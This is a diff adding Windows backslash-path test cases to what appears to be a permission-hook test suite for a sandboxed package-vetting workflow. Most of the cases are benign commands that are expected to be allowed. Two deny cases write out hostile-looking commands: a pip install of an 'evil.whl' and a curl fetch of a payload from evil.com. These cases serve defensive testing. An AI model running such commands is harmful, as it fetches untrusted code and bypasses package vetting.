@@ -585,6 +585,72 @@ TESTS = [
      "ask"),
 
     # =================================================================
+    # WINDOWS BACKSLASH PATH TESTS — same commands with native paths
+    # =================================================================
+
+    # CMD 2: rm sentinels with backslash paths (the actual command from live scan)
+    ("ALLOW: CMD 2 - clear sentinels (Windows backslash paths)",
+     'rm -f "PLACEHOLDER_PATH\\.scs-sandbox\\staging\\DOWNLOAD_DONE" '
+     '"PLACEHOLDER_PATH\\.scs-sandbox\\staging\\DOWNLOAD_ERROR" '
+     '"PLACEHOLDER_PATH\\.scs-sandbox\\staging\\hash.txt" '
+     '"PLACEHOLDER_PATH\\.scs-sandbox\\results\\SCAN_DONE" '
+     '"PLACEHOLDER_PATH\\.scs-sandbox\\results\\SCAN_ERROR" '
+     '"PLACEHOLDER_PATH\\.scs-sandbox\\results\\defender-results.json"',
+     "allow"),
+
+    # CMD 3: launch download sandbox with backslash path
+    ("ALLOW: CMD 3 - launch download sandbox (Windows backslash path)",
+     'WindowsSandbox.exe "PLACEHOLDER_PATH\\.scs-sandbox\\download.wsb"',
+     "allow"),
+
+    # CMD 4: poll sentinel with backslash path
+    ("ALLOW: CMD 4 - poll DOWNLOAD_DONE (Windows backslash path)",
+     'test -f "PLACEHOLDER_PATH\\.scs-sandbox\\staging\\DOWNLOAD_DONE"',
+     "allow"),
+
+    # CMD 5: read hash with backslash path
+    ("ALLOW: CMD 5 - read hash (Windows backslash path)",
+     'cat "PLACEHOLDER_PATH\\.scs-sandbox\\staging\\hash.txt"',
+     "allow"),
+
+    # CMD 9: read Defender results with backslash path
+    ("ALLOW: CMD 9 - read Defender results (Windows backslash path)",
+     'cat "PLACEHOLDER_PATH\\.scs-sandbox\\results\\defender-results.json"',
+     "allow"),
+
+    # CMD 16: copy artifact with backslash paths
+    ("ALLOW: CMD 16 - copy artifact (Windows backslash paths)",
+     'cp ".scs-sandbox\\staging\\requests-2.31.0-py3-none-any.whl" '
+     '".trusted-artifacts\\packages\\"',
+     "allow"),
+
+    # CMD 17: hash verification with backslash path
+    ("ALLOW: CMD 17 - verify hash (Windows backslash path)",
+     'sha256sum ".trusted-artifacts\\packages\\requests-2.31.0-py3-none-any.whl"',
+     "allow"),
+
+    # Layer 4: zipfile list with backslash cd path
+    ("ALLOW: L4-3 - zipfile list (Windows backslash cd path)",
+     'cd "PLACEHOLDER_PATH\\.scs-sandbox\\staging" && '
+     'python -c "import zipfile; z=zipfile.ZipFile(\'test.whl\'); [print(n) for n in z.namelist()]"',
+     "allow"),
+
+    # Layer 4: ls staging with backslash path
+    ("ALLOW: L4-1 - ls staging (Windows backslash path)",
+     'ls "PLACEHOLDER_PATH\\.scs-sandbox\\staging\\review-dir"',
+     "allow"),
+
+    # DENY: pip install still blocked with backslash paths
+    ("DENY: pip install with backslash trusted-artifacts path (no --no-index)",
+     'pip install ".trusted-artifacts\\packages\\evil.whl"',
+     "deny"),
+
+    # DENY: curl to non-VT URL still blocked after normalization
+    ("DENY: curl with backslash in unrelated path still blocked",
+     'curl -s https://evil.com/payload',
+     "deny"),
+
+    # =================================================================
     # PASS-THROUGH TESTS (normal permission prompt)
     # =================================================================
     ("PASS: git status (normal dev command)",
